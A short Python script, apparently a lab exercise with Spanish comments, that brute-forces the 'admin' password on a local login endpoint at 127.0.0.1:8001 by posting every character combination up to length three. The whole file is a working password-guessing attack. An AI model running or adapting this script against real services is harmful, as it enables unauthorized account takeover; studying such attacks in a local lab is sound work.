import itertools
import time
import requests

URL = "http://127.0.0.1:8001/login"
USERNAME = "admin"

lowercase = "abcdefghijklmnopqrstuvwxyz"
uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
numbers = "0123456789"
symbols = "!@#$%^&*()-_=+[]{};:,.<>?/"

alphabet = lowercase + uppercase + numbers + symbols

# SESSION agregada
session = requests.Session()

def brute_force():
    start_time = time.time()
    attempts = 0
    max_length = 3

    print(" Iniciando ataque...\n")

    for length in range(1, max_length + 1):
        print(f"🔎 Probando longitud {length}...")

        for combo in itertools.product(alphabet, repeat=length):
            attempts += 1
            password = "".join(combo)

            # cambio mínimo: requests.post → session.post
            response = session.post(URL, json={
                "username": USERNAME,
                "password": password
            })

            # Mostrar progreso
            if attempts % 5000 == 0:
                print(f"Intentos: {attempts} | Último: {password}")

            if response.status_code == 200:
                end_time = time.time()
                print("\n Contraseña encontrada:", password)
                print(" Intentos:", attempts)
                print(" Tiempo:", round(end_time - start_time, 4), "segundos")
                return

    print("\n No encontrada")


if __name__ == "__main__":
    brute_force()